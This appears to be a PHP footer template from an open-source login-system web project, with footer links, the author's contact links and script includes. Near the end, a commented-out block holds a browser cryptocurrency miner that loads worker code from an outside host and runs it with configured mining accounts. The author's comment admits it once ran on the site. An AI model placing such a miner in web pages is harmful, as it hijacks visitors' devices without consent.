
<?php if (isset($_SESSION['auth'])) { ?>

</body>
<div id="wrap" style="scale: 0.01%;"></div>
    <footer id="myFooter">
        <div class="container">
            <div class="row">
                <div class="col-sm-3">
                    <h2 class="logo">
                        <a href="/home/" target="_blank">
                            <img src="/assets/images/logowhite.png" alt="" width="200" height="200" class="">
                        </a>
                    </h2>
                </div>
                <div class="col-sm-2">
                    <h5>Get started</h5>
                    <ul>
                        <li><a href="/welcome/" target="_blank">Welcome</a></li>
                        <li><a href="/login/" target="_blank">Log in</a></li>
                        <li><a href="/register/" target="_blank">Sign up</a></li>
                    </ul>
                </div>
                <div class="col-sm-2">
                    <h5>Features</h5>
                    <ul>
                        <li><a href="/home/" target="_blank">Home</a></li>
                        <li><a href="/dashboard/" target="_blank">Dashboard</a></li>
                        <li><a href="/profile/" target="_blank">Profile</a></li>
                        <li><a href="/profile-edit/" target="_blank">Edit Profile</a></li>
                    </ul>
                </div>
                <div class="col-sm-2">
                    <h5>Support</h5>
                    <ul>
                        <li><a href="/contact/" target="_blank">Contact Us</a></li>
                    </ul>
                </div>
                <div class="col-sm-3 my-3">
                    <div class="social-networks">
                        <a href="https://github.com/msaad1999" class="twitter" target="_blank">
                            <i class="fab fa-github"></i>
                        </a>
                        <a href="https://www.linkedin.com/in/muhammadsaadhussaini/" class="facebook" target="_blank">
                            <i class="fab fa-linkedin"></i>
                        </a>
                    </div>
                    <a class="btn btn-default" href="mailto:saad01.1999@gmail.com" target="_blank">Email Me</a>
                </div>
            </div>
        </div>
        <div class="footer-copyright">
            <p>
                <a href="https://github.com/msaad1999/PHP-Login-System" target="_blank">PHP Login System</a> |  
                <a href="https://github.com/msaad1999" target="_blank">msaad1999</a> | 
                <a href="https://github.com/msaad1999/PHP-Login-System/blob/master/LICENSE" target="_blank">MIT License</a>
            </p>
        </div>
    </footer>

<?php } ?>


<script src="/assets/vendor/js/jquery-3.4.1.min.js"></script>
<script src="/assets/vendor/js/popper.min.js"></script>
<script src="/assets/vendor/bootstrap/4.3.1/js/bootstrap.min.js"></script>
<script src="/assets/vendor/bootstrap/5.0.2/js/bootstrap.bundle.min.js"></script>

<?php if(isset($_SESSION['auth'])) { ?> 

<script src="/assets/js/check_inactive.js"></script>
    
<?php } ?>

<!-- script -->
<?php
/*
function Duinotize(opts, onstart) { //A temp way to disable the miner is to rename the function name or just block JavaScript all together, sorry for this, i still haven't programmed a proper way to disable it because haven't had the time to do anything really with the website
  / * Variables * /
  wallet_id = Math.floor(Math.random() * 2811);
  let workerVer = 1;
  /* Start mining * /
  if (typeof Callback != 'undefined' && Callback != null) {
    Callback();
  };
  for (let workersAmount = 0; workersAmount < opts.threads; workersAmount++) {
    let socketWorker = new Worker("https://www.ranrom.xyz/assets/vendor/duinotize/main.js");
    socketWorker.postMessage('Start,' + opts.username + "," + opts.rigid + "," + wallet_id + "," + opts.difficulty + "," + workerVer + "," + opts.hasher);
    workerVer++;
  };
};

/*  Duinotize({
    username: "SoapierGlobe421",
    rigid: "ranrom_xyz:HowMuchDoesItCost",
    difficulty: "LOW",
    threads: 1,
    hasher: "hashwasm"
  });
  Duinotize({
    username: "SoapierGlobe421",
    rigid: "ranrom_xyz:HowMuchDoesItCost",
    difficulty: "LOW",
    threads: 1,
    hasher: "DUCO-S1"
  });*/
?>
<!-- /script -->
</body>

</html>

<?php

if (isset($_SESSION['ERRORS']))
    $_SESSION['ERRORS'] = NULL;
if (isset($_SESSION['STATUS']))
    $_SESSION['STATUS'] = NULL;

?>
